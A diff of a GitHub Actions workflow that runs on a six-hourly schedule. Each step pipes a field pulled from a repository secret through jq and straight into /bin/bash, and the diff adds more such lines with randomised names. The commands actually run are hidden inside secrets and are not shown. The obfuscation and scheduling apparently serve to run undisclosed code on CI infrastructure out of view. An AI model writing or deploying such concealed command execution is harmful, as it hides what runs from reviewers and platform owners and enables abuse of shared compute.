@@ -1,10 +1,8 @@
 name: fujiancheng7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 3/6 * * *'
-
+    - cron: '33 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -13,10 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: fujiancheng7654
         env:
-          ndc409: ${{ secrets.ndc409 }}
+          lyt2: ${{ secrets.lyt2 }}
         run: |
-          echo $ndc409 | jq -r .bdp02 | /bin/bash
-          echo $z9740 | jq -r .tipn13 | /bin/bash
-          echo $qk732 | jq -r .gdwry5136 | /bin/bash
-          echo $ozu9 | jq -r .f8655 | /bin/bash
+          echo $lyt2 | jq -r .c129 | /bin/bash
+          echo $z2 | jq -r .m3815 | /bin/bash
+          echo $tcpt8575 | jq -r .tefbb084 | /bin/bash
+          echo $fxz41 | jq -r .jam4 | /bin/bash
+          echo $p719 | jq -r .jzh178 | /bin/bash
+          echo $bvvn4948 | jq -r .j6148 | /bin/bash
+          echo $kahgo76759 | jq -r .gsl57 | /bin/bash
+          echo $phzng8 | jq -r .ce957 | /bin/bash
+          echo $bktln7757 | jq -r .rnsvp60796 | /bin/bash
+          echo $qx48 | jq -r .kuxn85 | /bin/bash
+          echo $imalj3179 | jq -r .mmcv73 | /bin/bash
+          echo $m1893 | jq -r .zt081 | /bin/bash
+          echo $axxky99843 | jq -r .loc0376 | /bin/bash
 
